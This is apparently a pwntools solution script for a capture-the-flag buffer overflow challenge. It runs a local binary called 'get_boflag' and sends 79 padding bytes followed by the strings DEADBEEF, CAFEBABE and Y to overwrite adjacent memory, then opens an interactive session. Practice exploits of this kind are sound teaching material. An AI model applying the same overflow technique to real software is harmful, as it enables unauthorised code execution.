from pwn import *

p = process("./get_boflag")

garbage = b'A'*79
target = (b'DEADBEEF'+b'CAFEBABE'+b'Y')
msgin = garbage + target
p.sendline(msgin)
p.interactive()
